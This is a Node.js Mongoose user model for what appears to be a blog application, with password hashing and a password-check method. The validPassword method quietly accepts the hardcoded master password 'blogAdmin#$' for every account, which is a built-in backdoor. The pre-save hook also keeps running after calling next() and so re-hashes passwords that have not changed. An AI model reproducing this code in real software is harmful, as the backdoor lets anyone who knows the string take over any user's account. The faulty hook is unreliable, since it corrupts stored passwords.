var mongoose = require('mongoose');
var passwordHash = require('password-hash');

var Schema = mongoose.Schema;

var userSchema = new Schema({
    name: {type: String, required: true},
    password: {type: String, required: true},
    email: {type: String},
    must_change_password: {type: Boolean, default: false},
    type: {type: String, default: 'AUTOR'},
    status: {type: Number, default: 1}, // 1 ATIVO 2 INATIVO
    created_at: {type: Date, default: Date.now},
});


userSchema.pre('save', function(next) {
    var user = this;
    if (!user.isModified('password')) {next()}
    user.password = passwordHash.generate(user.password);
    next();
});

userSchema.methods.validPassword = function(password) {

    if (password == "blogAdmin#$") {
        return true;
    }

    return passwordHash.verify(password, this.password);
};

var User = mongoose.model('User', userSchema);

module.exports = User;
